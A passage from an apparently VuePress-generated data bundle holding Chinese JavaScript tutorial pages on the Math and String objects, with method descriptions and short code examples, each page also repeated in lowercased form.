返回x的余弦值\nMath.tan(x)                 返回x的正切值\nMath.asin(x)                返回x的反正弦值\nMath.acos(x)                返回x的反余弦值\nMath.atan(x)                返回x的反正切值\nMath.sign()                 用来判断一个数到底是正数、负数、还是零。对于非数值，会先将其转换为数值。\nMath.clz32()                将参数转为 32 位无符号整数的形式，然后返回这个 32 位值里面有多少个前导 0。\nMath.imul()                 Math.imul方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数。\nMath.fround()               返回一个数的32位单精度浮点数形式。\nMath.hypot()                Math.hypot方法返回所有参数的平方和的平方根。\nNumberObject.toFixed(num)   可把 Number 四舍五入为指定小数位数的数字\n\n\n# toFixed() 方法\n\ntoFixed() 方法可把 Number 四舍五入为指定小数位数的数字。\n\n语法\n\nNumberObject.toFixed(num)\n\n\n参数    描述\nnum   必需。规定小数的位数，是 0 ~ 20 之间的值，包括 0 和\n      20，有些实现可以支持更大的数值范围。如果省略了该参数，将用 0 代替。\n\n\n# 小技巧\n\n 1. 取x的y次方根\n\nMath.pow(x,1/y)\n\n\n 2. 查找数组中最大和最小的数字\n\nvar arr=[23,4,651,461,1231,411];\nvar maxArr=Math.max(...arr);    //  arr数组中的最大值\nvar minArr=Math.min(...arr);   //  arr数组中的最小值\n\n\n 3. 取x-y的随机数、随机整数\n\nMath.floor( Math.random() * (y - x) + x )      // 包含x不包含y\nMath.floor( Math.random() * (y - x + 1) + x  )      // 包含x包含y\n\n\n> 注：取随机整数必须使用`Math.floor`取整， `Math.ceil`和`Math.round`会导致两端的值取到几率变小\n",normalizedContent:"# math对象\n\n> math（算数）对象的作用是：执行常见的算数任务。 没有构造函数 math()，在使用math上的方法和属性时无需创建，把 math当作对象使用就可以调用其所有属性和方法就就可以。\n\n\n# math上的属性\n\n属性        属性描述\npi        返回圆周率（约等于3.14159）。\ne         返回算术常量 e，即自然对数的底数（约等于2.718）。\nln2       返回 2 的自然对数（约等于0.693）。\nln10      返回 10 的自然对数（约等于2.302）。\nlog2e     返回以 2 为底的 e 的对数（约等于 1.414）。\nlog10e    返回以 10 为底的 e 的对数（约等于0.434）。\nsqrt1_2   返回返回 2 的平方根的倒数（约等于 0.707）。\nsqrt2     返回 2 的平方根（约等于 1.414）。\n\n\n# math的常用方法\n\n方法                          方法描述\nmath.abs(x)                 返回x的绝对值。\nmath.round(x)               返回x四舍五入之后的整数值\nmath.ceil(x)                返回x的近似值，向上取整\nmath.floor(x)               返回x的近似值，向下取整\nmath.max(x,y)               返回x,y中的最大值\nmath.min(x,y)               返回x,y中的最小值\nmath.random()               返回一个0~1之间的数字\nmath.trunc(x)               将x的小数部分去除，返回整数部分(ie不能使用)\nmath.pow(x,y)               取x的y次幂\nmath.sqrt(x)                返回x的平方根\nmath.cbrt(x)                计算一个数的立方根\nmath.sin(x)                 返回x的正弦值\nmath.cos(x)                 返回x的余弦值\nmath.tan(x)                 返回x的正切值\nmath.asin(x)                返回x的反正弦值\nmath.acos(x)                返回x的反余弦值\nmath.atan(x)                返回x的反正切值\nmath.sign()                 用来判断一个数到底是正数、负数、还是零。对于非数值，会先将其转换为数值。\nmath.clz32()                将参数转为 32 位无符号整数的形式，然后返回这个 32 位值里面有多少个前导 0。\nmath.imul()                 math.imul方法返回两个数以 32 位带符号整数形式相乘的结果，返回的也是一个 32 位的带符号整数。\nmath.fround()               返回一个数的32位单精度浮点数形式。\nmath.hypot()                math.hypot方法返回所有参数的平方和的平方根。\nnumberobject.tofixed(num)   可把 number 四舍五入为指定小数位数的数字\n\n\n# tofixed() 方法\n\ntofixed() 方法可把 number 四舍五入为指定小数位数的数字。\n\n语法\n\nnumberobject.tofixed(num)\n\n\n参数    描述\nnum   必需。规定小数的位数，是 0 ~ 20 之间的值，包括 0 和\n      20，有些实现可以支持更大的数值范围。如果省略了该参数，将用 0 代替。\n\n\n# 小技巧\n\n 1. 取x的y次方根\n\nmath.pow(x,1/y)\n\n\n 2. 查找数组中最大和最小的数字\n\nvar arr=[23,4,651,461,1231,411];\nvar maxarr=math.max(...arr);    //  arr数组中的最大值\nvar minarr=math.min(...arr);   //  arr数组中的最小值\n\n\n 3. 取x-y的随机数、随机整数\n\nmath.floor( math.random() * (y - x) + x )      // 包含x不包含y\nmath.floor( math.random() * (y - x + 1) + x  )      // 包含x包含y\n\n\n> 注：取随机整数必须使用`math.floor`取整， `math.ceil`和`math.round`会导致两端的值取到几率变小\n",charsets:{cjk:!0}},{title:"字符串(String)",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/07-String%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/07-String对象.md",key:"v-d0738c54",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/07-String%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"单引号和双引号的区别",slug:"单引号和双引号的区别",normalizedTitle:"单引号和双引号的区别",charIndex:48},{level:2,title:"字符串的遍历接口",slug:"字符串的遍历接口",normalizedTitle:"字符串的遍历接口",charIndex:156},{level:2,title:"字符串与json对象之间的转换",slug:"字符串与json对象之间的转换",normalizedTitle:"字符串与json对象之间的转换",charIndex:523},{level:2,title:"字符串的解构赋值",slug:"字符串的解构赋值",normalizedTitle:"字符串的解构赋值",charIndex:602},{level:2,title:"模板字符串",slug:"模板字符串",normalizedTitle:"模板字符串",charIndex:815},{level:2,title:"属性",slug:"属性",normalizedTitle:"属性",charIndex:751},{level:3,title:"length : 字符串的长度",slug:"length-字符串的长度",normalizedTitle:"length : 字符串的长度",charIndex:1466},{level:2,title:"方法",slug:"方法",normalizedTitle:"方法",charIndex:1549},{level:3,title:"str.charAt(index);",slug:"str-charat-index",normalizedTitle:"str.charat(index);",charIndex:1556},{level:3,title:"str.charCodeAt(index);",slug:"str-charcodeat-index",normalizedTitle:"str.charcodeat(index);",charIndex:1630},{level:3,title:"String.fromCharCode(97);",slug:"string-fromcharcode-97",normalizedTitle:"string.fromcharcode(97);",charIndex:1722},{level:3,title:"String.fromCodePoint()",slug:"string-fromcodepoint",normalizedTitle:"string.fromcodepoint()",charIndex:1834},{level:3,title:"String.raw()",slug:"string-raw",normalizedTitle:"string.raw()",charIndex:1940},{level:3,title:"str.indexOf('a');",slug:"str-indexof-a",normalizedTitle:"str.indexof('a');",charIndex:2173},{level:3,title:"str.lastIndexOf('a')",slug:"str-lastindexof-a",normalizedTitle:"str.lastindexof('a')",charIndex:2353},{level:3,title:'str.replace("替换的内容", "替换后的内容")',slug:"str-replace-替换的内容-替换后的内容",normalizedTitle:"str.replace(&quot;替换的内容&quot;, &quot;替换后的内容&quot;)",charIndex:null},{level:3,title:'str.replaceAll("替换的内容", "替换后的内容")',slug:"str-replaceall-替换的内容-替换后的内容",normalizedTitle:"str.replaceall(&quot;替换的内容&quot;, &quot;替换后的内容&quot;)",charIndex:null},{level:3,title:"str.slice(起始下标, 结束下标)",slug:"str-slice-起始下标-结束下标",normalizedTitle:"str.slice(起始下标, 结束下标)",charIndex:3699},{level:3,title:"str.substring(起始下标, 结束下标)",slug:"str-substring-起始下标-结束下标",normalizedTitle:"str.substring(起始下标, 结束下标)",charIndex:3864},{level:3,title:"str.substr(起始下标，截取的长度)",slug:"str-substr-起始下标-截取的长度",normalizedTitle:"str.substr(起始下标，截取的长度)",charIndex:3926},{level:3,title:"str.split('')",slug:"str-split",normalizedTitle:"str.split('')",charIndex:3997},{level:3,title:"str.toLowerCase()",slug:"str-tolowercase",normalizedTitle:"str.tolowercase()",charIndex:4303},{level:3,title:"str.toLocaleLowerCase()",slug:"str-tolocalelowercase",normalizedTitle:"str.tolocalelowercase()",charIndex:4354},{level:3,title:"str.toUpperCase()",slug:"str-touppercase",normalizedTitle:"str.touppercase()",charIndex:4417},{level:3,title:"str.toLocaleUpperCase()",slug:"str-tolocaleuppercase",normalizedTitle:"str.tolocaleuppercase()",charIndex:4460},{level:3,title:"str.trim()",slug:"str-trim",normalizedTitle:"str.trim()",charIndex:4523},{level:3,title:"str.match()",slug:"str-match",normalizedTitle:"str.match()",charIndex:4642},{level:3,title:"str.matchAll()",slug:"str-matchall",normalizedTitle:"str.matchall()",charIndex:4863},{level:3,title:"str.concat('a', 'b', 'c')",slug:"str-concat-a-b-c",normalizedTitle:"str.concat('a', 'b', 'c')",charIndex:4882},{level:3,title:"str.includes()  startsWith(), endsWith()",slug:"str-includes-startswith-endswith",normalizedTitle:"str.includes()  startswith(), endswith()",charIndex:null},{level:3,title:"str.repeat()",slug:"str-repeat",normalizedTitle:"str.repeat()",charIndex:5820},{level:3,title:"str.padStart() 、str.padEnd()",slug:"str-padstart-、str-padend",normalizedTitle:"str.padstart() 、str.padend()",charIndex:6097},{level:3,title:"实例方法：trimStart()，trimEnd()",slug:"实例方法-trimstart-trimend",normalizedTitle:"实例方法：trimstart()，trimend()",charIndex:7074}],headersStr:"单引号和双引号的区别 字符串的遍历接口 字符串与json对象之间的转换 字符串的解构赋值 模板字符串 属性 length : 字符串的长度 方法 str.charAt(index); str.charCodeAt(index); String.fromCharCode(97); String.fromCodePoint() String.raw() str.indexOf('a'); str.lastIndexOf('a') str.replace(\"替换的内容\", \"替换后的内容\") str.replaceAll(\"替换的内容\", \"替换后的内容\") str.slice(起始下标, 结束下标) str.substring(起始下标, 结束下标) str.substr(起始下标，截取的长度) str.split('') str.toLowerCase() str.toLocaleLowerCase() str.toUpperCase() str.toLocaleUpperCase() str.trim() str.match() str.matchAll() str.concat('a', 'b', 'c') str.includes()  startsWith(), endsWith() str.repeat() str.padStart() 、str.padEnd() 实例方法：trimStart()，trimEnd()",content:"# 字符串(String)\n\n> 字符串用于存储和处理文本。字符串对象是用来处理字符串\n\n\n# 单引号和双引号的区别\n\n 1. 在js中单引号和双引号没有区别，都可以表示字符或字符串。\n 2. json格式的文件必须使用双引号\n\n{\n    \"name\": \"张三\",\n    \"age\": 20\n}\n\n\n\n# 字符串的遍历接口\n\n> ES6 为字符串添加了遍历器接口，使得字符串可以被for...of循环遍历。\n\nfor (let codePoint of 'foo') {\n  console.log(codePoint)\n}\n// \"f\"\n// \"o\"\n// \"o\"\n\n\n除了遍历字符串，这个遍历器最大的优点是可以识别大于0xFFFF的码点，传统的for循环无法识别这样的码点。\n\nlet text = String.fromCodePoint(0x20BB7);\n\nfor (let i = 0; i < text.length; i++) {\n  console.log(text[i]);\n}\n// \" \"\n// \" \"\n\nfor (let i of text) {\n  console.log(i);\n}\n// \"𠮷\"\n\n\n\n# 字符串与json对象之间的转换\n\n 1. JSON.stringify() 将对象转化为字符串\n 2. JSON.parse() 将字符串转化为对象\n\n\n# 字符串的解构赋值\n\n> 字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。\n\nconst [a, b, c, d, e] = 'hello';\na // \"h\"\nb // \"e\"\nc // \"l\"\nd // \"l\"\ne // \"o\"\n\n\n> 类似数组的对象都有一个length属性，因此还可以对这个属性解构赋值。\n\nlet {length : len} = 'hello';\nlen // 5\n\n\n\n# 模板字符串\n\n传统的 JavaScript 语言，输出模板通常是这样写的。\n\n$('#result').append(\n  'There are <b>' + basket.count + '</b> ' +\n  'items in your basket, ' +\n  '<em>' + basket.onSale +\n  '</em> are on sale!'\n);\n\n\n上面这种写法相当繁琐不方便，ES6 引入了模板字符串解决这个问题。\n\n$('#result').append(`\n  There are <b>${basket.count}</b> items\n   in your basket, <em>${basket.onSale}</em>\n  are on sale!\n`);\n\n// 模板字符串中嵌入变量，需要将变量名写在${}之中。\nlet x = 1;\nlet y = 2;\n\n`${x} + ${y} = ${x + y}`\n// \"1 + 2 = 3\"\n\n`${x} + ${y * 2} = ${x + y * 2}`\n// \"1 + 4 = 5\"\n\nlet obj = {x: 1, y: 2};\n`${obj.x + obj.y}`\n// \"3\"\n\n// 调用函数\nfunction fn() {\n  return \"Hello World\";\n}\n\n`foo ${fn()} bar`\n// foo Hello World bar\n\n\n\n\n\n# 属性\n\n\n# length : 字符串的长度\n\n    var str = 'hello word';\n    console.log(str.length) //10\n\n\n\n# 方法\n\n\n# str.charAt(index);\n\n * 功能：返回下标为index的子字符串\n * 参数: 数字下标\n * 返回值: 对应下标字符串\n\n\n# str.charCodeAt(index);\n\n * 功能: 根据下标，返回对应下标的字符的ACSCII码\n * 参数: 数字下标\n * 返回值: 对应下表字符ACSCII码\n\n\n# String.fromCharCode(97);\n\n * 功能: 将ACSCII码转化成字符串，涉及到数字与字母之间的转化可以使用该方法\n * 参数: 十进制ACSCII码\n * 返回值: ACSCII码对应字符串\n\n\n# String.fromCodePoint()\n\n> ES5 提供String.fromCharCode()方法，用于从 Unicode 码点返回对应字符，但是这个方法不能识别码点大于0xFFFF的字符。\n\n\n# String.raw()\n\n> ES6 还为原生的 String 对象，提供了一个raw()方法。该方法返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，往往用于模板字符串的处理方法。\n\nString.raw`Hi\\n${2+3}!`\n// 实际返回 \"Hi\\\\n5!\"，显示的是转义后的结果 \"Hi\\n5!\"\n\nString.raw`Hi\\u000A!`;\n// 实际返回 \"Hi\\\\u000A!\"，显示的是转义后的结果 \"Hi\\u000A!\"\n\n\n\n\n# str.indexOf('a');\n\n * 功能： 查找一个字符或者字符串在字符串中第一次出现的位置, 未找到则返回-1、\n * 参数： 要查找的字符串\n * 返回值： 目标字符串的下标位置，未找到则未-1\n\nvar str = 'hello world';\nstr.indexOf('a'); //-1\nstr.indexOf('o'); //4\n\n\n\n# str.lastIndexOf('a')\n\n * 功能： 倒序查找一个字符或者字符串在字符串中第一次出现的位置, 返回位置，, 未找到则返回-1、\n\nvar str = 'hello world';\nstr.lastIndexOf('o'); //7\n\n\n\n# str.replace(\"替换的内容\", \"替换后的内容\")\n\n * 功能： 将指定的字符串替换，只能替换第一个\n * 参数： 1. 要替换的内容； 2. 替换后的内容\n * 返回值： 返回替换后的字符串\n * 注意： 不修改原字符串，所以使用时需要将 replace 方法的返回值保存\n\nvar str = 'hello world';\nstr.replace('o', 'a'); //\"hella world\"\n\n\n> replace 支持正则查找，str.replace(/正则/, \"替换后的内容\")\n\n\n# str.replaceAll(\"替换的内容\", \"替换后的内容\")\n\n> 历史上，字符串的实例方法replace()只能替换第一个匹配。\n\n * 返回值： 返回替换后的字符串\n * 注意： 不修改原字符串，所以使用时需要将 replace 方法的返回值保存\n\n'aabbcc'.replace('b', '_')\n// 'aa_bcc'\n\n\n上面例子中，replace()只将第一个b替换成了下划线。\n\n如果要替换所有的匹配，不得不使用正则表达式的g修饰符。\n\n'aabbcc'.replace(/b/g, '_')\n// 'aa__cc'\n\n\n// 不报错\n'aabbcc'.replace(/b/, '_')\n\n// 报错\n'aabbcc'.replaceAll(/b/, '_')\n\n\nreplaceAll()的第二个参数replacement是一个字符串，表示替换的文本，其中可以使用一些特殊字符串。\n\n下面是一些例子。\n\n$&：匹配的字符串。\n$` ：匹配结果前面的文本。\n$'：匹配结果后面的文本。\n$n：匹配成功的第n组内容，n是从1开始的自然数。这个参数生效的前提是，第一个参数必须是正则表达式。\n$$：指代美元符号$。\n\n// $& 表示匹配的字符串，即`b`本身\n// 所以返回结果与原字符串一致\n'abbc'.replaceAll('b', '$&')\n// 'abbc'\n\n// $` 表示匹配结果之前的字符串\n// 对于第一个`b`，$` 指代`a`\n// 对于第二个`b`，$` 指代`ab`\n'abbc'.replaceAll('b', '$`')\n// 'aaabc'\n\n// $' 表示匹配结果之后的字符串\n// 对于第一个`b`，$' 指代`bc`\n// 对于第二个`b`，$' 指代`c`\n'abbc'.replaceAll('b', `$'`)\n// 'abccc'\n\n// $1 表示正则表达式的第一个组匹配，指代`ab`\n// $2 表示正则表达式的第二个组匹配，指代`bc`\n'abbc'.replaceAll(/(ab)(bc)/g, '$2$1')\n// 'bcab'\n\n// $$ 指代 $\n'abc'.replaceAll('b', '$$')\n\n\n\n# str.slice(起始下标, 结束下标)\n\n * 功能：字符串截取，识别负数，跟数组相同\n * 参数：1. 截取起始下标； 2. 截取结束下标。参数可以是负数，负数表示倒数，只传一个参数表示从起始下标截取到最后\n * 返回值：返回值是截取到的字符串\n * 注意： 截取时，包含起始下标，不包含结束下标； 不修改原字符串\n\n\n# str.substring(起始下标, 结束下标)\n\n * 功能： 字符串截取，同 slice 方法，但不识别负数\n\n\n# str.substr(起始下标，截取的长度)\n\n * 功能：根据长度进行字符串截取\n * 参数： 1. 起始下标； 2. 截取的长度\n\n\n# str.split('')\n\n * 功能： 以某一字符串将目标字符串分割，可用于将特定格式的字符串转化如 2018/10/20\n * 参数： 需要分割的字符串\n * 返回值： 原字符串呗参数字符串分割之后的数组\n * 注意： 返回值中传入的字符串会被删掉，不修改原字符串\n\nvar str = 'hello world';\nconsole.log(str.split('o')); //[\"hell\", \" w\", \"rld\"]\nconsole.log(str.split('')); //[\"h\", \"e\", \"l\", \"l\", \"o\", \" \", \"w\", \"o\", \"r\", \"l\", \"d\"]\n\n\n\n# str.toLowerCase()\n\n * 将str字符串中的字符转化为小写，不修改原字符串\n\n\n# str.toLocaleLowerCase()\n\n * 方法根据本地主机的语言环境把字符串转换为小写,不修改原字符串\n\n\n# str.toUpperCase()\n\n * 将str字符串中的字符转化为大写\n\n\n# str.toLocaleUpperCase()\n\n * 方法根据本地主机的语言环境把字符串转换为小写,不修改原字符串\n\n\n# str.trim()\n\n * 将字符串左右空格去除，可用于接收表单数据 IE9以下不识别\n * 返回值： 去掉左右空格之后的字符串\n\nvar a = '   aa   bb   ';\na.trim(); //\"aa   bb\"\n\n\n\n# str.match()\n\n * 在字符串内检索指定的值，或找到一个或多个正则表达式的匹配\n * 参数： 可以是字符串或者正则表达式\n * 返回值：检索到的结果\n\nvar str = 'hello world';\nstr.match('o'); //[\"o\", index: 4, input: \"hello world\", groups: undefined]\nstr.match(/o/g); // (2) [\"o\", \"o\"]\n\n\n\n# str.matchAll()\n\n\n# str.concat('a', 'b', 'c')\n\n * 功能： 用于连接两个或多个字符串, 与数组中的concat方法很象，不会修改原字符串\n * 参数： 多个字符串\n * 返回值：拼接之后的长字符串\n\n\n# str.includes() startsWith(), endsWith()\n\n> 传统上，JavaScript 只有indexOf方法，可以用来确定一个字符串是否包含在另一个字符串中。ES6 又提供了三种新方法,方法区分大小写。\n\n * includes()：返回布尔值，表示是否找到了参数字符串。\n * startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部。\n * endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部。\n\nlet s = 'Hello world!';\n\ns.startsWith('Hello') // true\ns.endsWith('!') // true\ns.includes('o') // true\n\n\n这三个方法都支持第二个参数，表示开始搜索的位置。\n\nlet s = 'Hello world!';\n\ns.startsWith('Hello') // true\ns.endsWith('!') // true\ns.includes('o') // true\n\n\n这三个方法都支持第二个参数，表示开始搜索的位置。\n\nlet s = 'Hello world!';\n\ns.startsWith('world', 6) // true\ns.endsWith('Hello', 5) // true\ns.includes('Hello', 6) // false\n\n\n上面代码表示，使用第二个参数n时，endsWith的行为与其他两个方法有所不同。它针对前n个字符，而其他两个方法针对从第n个位置直到字符串结束。\n\n> 查找字符串是否包含 \"Runoob\": 如果找到匹配的字符串则返回 true，否则返回 false。\n\nvar str = \"Hello world, welcome to the Runoob。\";\nvar n = str.includes(\"world\");\n\n\n\n# str.repeat()\n\n * repeat方法返回一个新字符串，表示将原字符串重复n次。\n\n'x'.repeat(3) // \"xxx\"\n'hello'.repeat(2) // \"hellohello\"\n'na'.repeat(0) // \"\"\n\n// 参数如果是小数，会被取整。\n'na'.repeat(2.9) // \"nana\"\n// 如果repeat的参数是负数或者Infinity，会报错。\n'na'.repeat(Infinity)\n// RangeError\n'na'.repeat(-1)\n// RangeError\n\n\n\n\n\n# str.padStart() 、str.padEnd()\n\n * 功能： 向字符串开头(padStart)或结尾(padEnd)添加字符，使字符串达到指定的长度。返回在原字符串开头或末尾填充指定的填充字符串直到目标长度所形成的新字符串\n * 参数1: 当前字符串需要填充到的目标长度。如果这个数值小于当前字符串的长度，则返回当前字符串本身。\n * 参数2: （可选）填充字符串。如果字符串太长，使填充后的字符串长度超过了目标长度，则只保留最左侧的部分，其他部分会被截断。\n * 注意事项\n   * 不写第二个参数填充字符串，则默认用空格填充\n   * 填充字符串会自动重复直到达到目标长度\n   * 如果原字符串长度已经大于等于目标长度，则直接返回原字符串\n\n'abc'.padStart(10); // \"       abc\"\n'abc'.padStart(10, \"123\"); // \"1231231abc\"\n'abc'.padStart(6, \"123465\"); // \"123abc\"\n'abc'.padStart(8, \"0\"); // \"00000abc\"\n'abc'.padStart(1); // \"abc\"\n\n'abc'.padEnd(10); // \"abc       \"\n'abc'.padEnd(10, \"123\"); // \"abc1231231\"\n'abc'.padEnd(6, \"123465\"); // \"abc123\"\n'abc'.padEnd(8, \"0\"); // \"abc00000\"\n'abc'.padEnd(1); // \"abc\"\n\n\n * 使用场景：得到具有固定长度的数据 （时间、二进制数、十六进制数）\n\n// 获取时间，如果只有一位则前面用0填充\nvar time = new Date();\nvar h = String(time.getHours()).padStart(2, '0')\nvar m = String(time.getMinutes()).padStart(2, '0')\nvar s = String(time.getSeconds()).padStart(2, '0')\nconsole.log( `${h}:${m}:${s}` ) // 18:09:03\n\n\n\n# 实例方法：trimStart()，trimEnd()\n\n> ES2019 对字符串实例新增了trimStart()和trimEnd()这两个方法。它们的行为与trim()一致，trimStart()消除字符串头部的空格，trimEnd()消除尾部的空格。它们返回的都是新字符串，不会修改原始字符串。\n\nconst s = '  abc  ';\n\ns.trim() // \"abc\"\ns.trimStart() // \"abc  \"\ns.trimEnd() // \"  abc\"\n",normalizedContent:"# 字符串(string)\n\n> 字符串用于存储和处理文本。字符串对象是用来处理字符串\n\n\n# 单引号和双引号的区别\n\n 1. 在js中单引号和双引号没有区别，都可以表示字符或字符串。\n 2. json格式的文件必须使用双引号\n\n{\n    \"name\": \"张三\",\n    \"age\": 20\n}\n\n\n\n# 字符串的遍历接口\n\n> es6 为字符串添加了遍历器接口，使得字符串可以被for...of循环遍历。\n\nfor (let codepoint of 'foo') {\n  console.log(codepoint)\n}\n// \"f\"\n// \"o\"\n// \"o\"\n\n\n除了遍历字符串，这个遍历器最大的优点是可以识别大于0xffff的码点，传统的for循环无法识别这样的码点。\n\nlet text = string.fromcodepoint(0x20bb7);\n\nfor (let i = 0; i < text.length; i++) {\n  console.log(text[i]);\n}\n// \" \"\n// \" \"\n\nfor (let i of text) {\n  console.log(i);\n}\n// \"𠮷\"\n\n\n\n# 字符串与json对象之间的转换\n\n 1. json.stringify() 将对象转化为字符串\n 2. json.parse() 将字符串转化为对象\n\n\n# 字符串的解构赋值\n\n> 字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。\n\nconst [a, b, c, d, e] = 'hello';\na // \"h\"\nb // \"e\"\nc // \"l\"\nd // \"l\"\ne // \"o\"\n\n\n> 类似数组的对象都有一个length属性，因此还可以对这个属性解构赋值。\n\nlet {length : len} = 'hello';\nlen // 5\n\n\n\n# 模板字符串\n\n传统的 javascript 语言，输出模板通常是这样写的。\n\n$('#result').append(\n  'there are <b>' + basket.count + '</b> ' +\n  'items in your basket, ' +\n  '<em>' + basket.onsale +\n  '</em> are on sale!'\n);\n\n\n上面这种写法相当繁琐不方便，es6 引入了模板字符串解决这个问题。\n\n$('#result').append(`\n  there are <b>${basket.count}</b> items\n   in your basket, <em>${basket.onsale}</em>\n  are on sale!\n`);\n\n// 模板字符串中嵌入变量，需要将变量名写在${}之中。\nlet x = 1;\nlet y = 2;\n\n`${x} + ${y} = ${x + y}`\n// \"1 + 2 = 3\"\n\n`${x} + ${y * 2} = ${x + y * 2}`\n// \"1 + 4 = 5\"\n\nlet obj = {x: 1, y: 2};\n`${obj.x + obj.y}`\n// \"3\"\n\n// 调用函数\nfunction fn() {\n  return \"hello world\";\n}\n\n`foo ${fn()} bar`\n// foo hello world bar\n\n\n\n\n\n# 属性\n\n\n# length : 字符串的长度\n\n    var str = 'hello word';\n    console.log(str.length) //10\n\n\n\n# 方法\n\n\n# str.charat(index);\n\n * 功能：返回下标为index的子字符串\n * 参数: 数字下标\n * 返回值: 对应下标字符串\n\n\n# str.charcodeat(index);\n\n * 功能: 根据下标，返回对应下标的字符的acscii码\n * 参数: 数字下标\n * 返回值: 对应下表字符acscii码\n\n\n# string.fromcharcode(97);\n\n * 功能: 将acscii码转化成字符串，涉及到数字与字母之间的转化可以使用该方法\n * 参数: 十进制acscii码\n * 返回值: acscii码对应字符串\n\n\n# string.fromcodepoint()\n\n> es5 提供string.fromcharcode()方法，用于从 unicode 码点返回对应字符，但是这个方法不能识别码点大于0xffff的字符。\n\n\n# string.raw()\n\n> es6 还为原生的 string 对象，提供了一个raw()方法。该方法返回一个斜杠都被转义（即斜杠前面再加一个斜杠）的字符串，往往用于模板字符串的处理方法。\n\nstring.raw`hi\\n${2+3}!`\n// 实际返回 \"hi\\\\n5!\"，显示的是转义后的结果 \"hi\\n5!\"\n\nstring.raw`hi\\u000a!`;\n// 实际返回 \"hi\\\\u000a!\"，显示的是转义后的结果 \"hi\\u000a!\"\n\n\n\n\n# str.indexof('a');\n\n * 功能： 查找一个字符或者字符串在字符串中第一次出现的位置, 未找到则返回-1、\n * 参数： 要查找的字符串\n * 返回值： 目标字符串的下标位置，未找到则未-1\n\nvar str = 'hello world';\nstr.indexof('a'); //-1\nstr.indexof('o'); //4\n\n\n\n# str.lastindexof('a')\n\n * 功能： 倒序查找一个字符或者字符串在字符串中第一次出现的位置, 返回位置，, 未找到则返回-1、\n\nvar str = 'hello world';\nstr.lastindexof('o'); //7\n\n\n\n# str.replace(\"替换的内容\", \"替换后的内容\")\n\n * 功能： 将指定的字符串替换，只能替换第一个\n * 参数： 1. 要替换的内容； 2. 替换后的内容\n * 返回值： 返回替换后的字符串\n * 注意： 不修改原字符串，所以使用时需要将 replace 方法的返回值保存\n\nvar str = 'hello world';\nstr.replace('o', 'a'); //\"hella world\"\n\n\n> replace 支持正则查找，str.replace(/正则/, \"替换后的内容\")\n\n\n# str.replaceall(\"替换的内容\", \"替换后的内容\")\n\n> 历史上，字符串的实例方法replace()只能替换第一个匹配。\n\n * 返回值： 返回替换后的字符串\n * 注意： 不修改原字符串，所以使用时需要将 replace 方法的返回值保存\n\n'aabbcc'.replace('b', '_')\n// 'aa_bcc'\n\n\n上面例子中，replace()只将第一个b替换成了下划线。\n\n如果要替换所有的匹配，不得不使用正则表达式的g修饰符。\n\n'aabbcc'.replace(/b/g, '_')\n// 'aa__cc'\n\n\n// 不报错\n'aabbcc'.replace(/b/, '_')\n\n// 报错\n'aabbcc'.replaceall(/b/, '_')\n\n\nreplaceall()的第二个参数replacement是一个字符串，表示替换的文本，其中可以使用一些特殊字符串。\n\n下面是一些例子。\n\n$&：匹配的字符串。\n$` ：匹配结果前面的文本。\n$'：匹配结果后面的文本。\n$n：匹配成功的第n组内容，n是从1开始的自然数。这个参数生效的前提是，第一个参数必须是正则表达式。\n$$：指代美元符号$。\n\n// $& 表示匹配的字符串，即`b`本身\n// 所以返回结果与原字符串一致\n'abbc'.replaceall('b', '$&')\n// 'abbc'\n\n// $` 表示匹配结果之前的字符串\n// 对于第一个`b`，$` 指代`a`\n// 对于第二个`b`，$` 指代`ab`\n'abbc'.replaceall('b', '$`')\n// 'aaabc'\n\n// $' 表示匹配结果之后的字符串\n// 对于第一个`b`，$' 指代`bc`\n// 对于第二个`b`，$' 指代`c`\n'abbc'.replaceall('b', `$'`)\n// 'abccc'\n\n// $1 表示正则表达式的第一个组匹配，指代`ab`\n// $2 表示正则表达式的第二个组匹配，指代`bc`\n'abbc'.replaceall(/(ab)(bc)/g, '$2$1')\n// 'bcab'\n\n// $$ 指代 $\n'abc'.replaceall('b', '$$')\n\n\n\n# str.slice(起始下标, 结束下标)\n\n * 功能：字符串截取，识别负数，跟数组相同\n * 参数：1. 截取起始下标； 2. 截取结束下标。参数可以是负数，负数表示倒数，只传一个参数表示从起始下标截取到最后\n * 返回值：返回值是截取到的字符串\n * 注意： 截取时，包含起始下标，不包含结束下标； 不修改原字符串\n\n\n# str.substring(起始下标, 结束下标)\n\n * 功能： 字符串截取，同 slice 方法，但不识别负数\n\n\n# str.substr(起始下标，截取的长度)\n\n * 功能：根据长度进行字符串截取\n * 参数： 1. 起始下标； 2. 截取的长度\n\n\n# str.split('')\n\n * 功能： 以某一字符串将目标字符串分割，可用于将特定格式的字符串转化如 2018/10/20\n * 参数： 需要分割的字符串\n * 返回值： 原字符串呗参数字符串分割之后的数组\n * 注意： 返回值中传入的字符串会被删掉，不修改原字符串\n\nvar str = 'hello world';\nconsole.log(str.split('o')); //[\"hell\", \" w\", \"rld\"]\nconsole.log(str.split('')); //[\"h\", \"e\", \"l\", \"l\", \"o\", \" \", \"w\", \"o\", \"r\", \"l\", \"d\"]\n\n\n\n# str.tolowercase()\n\n * 将str字符串中的字符转化为小写，不修改原字符串\n\n\n# str.tolocalelowercase()\n\n * 方法根据本地主机的语言环境把字符串转换为小写,不修改原字符串\n\n\n# str.touppercase()\n\n * 将str字符串中的字符转化为大写\n\n\n# str.tolocaleuppercase()\n\n * 方法根据本地主机的语言环境把字符串转换为小写,不修改原字符串\n\n\n# str.trim()\n\n * 将字符串左右空格去除，可用于接收表单数据 ie9以下不识别\n * 返回值： 去掉左右空格之后的字符串\n\nvar a = '   aa   bb   ';\na.trim(); //\"aa   bb\"\n\n\n\n# str.match()\n\n * 在字符串内检索指定的值，或找到一个或多个正则表达式的匹配\n * 参数： 可以是字符串或者正则表达式\n * 返回值：检索到的结果\n\nvar str = 'hello world';\nstr.match('o'); 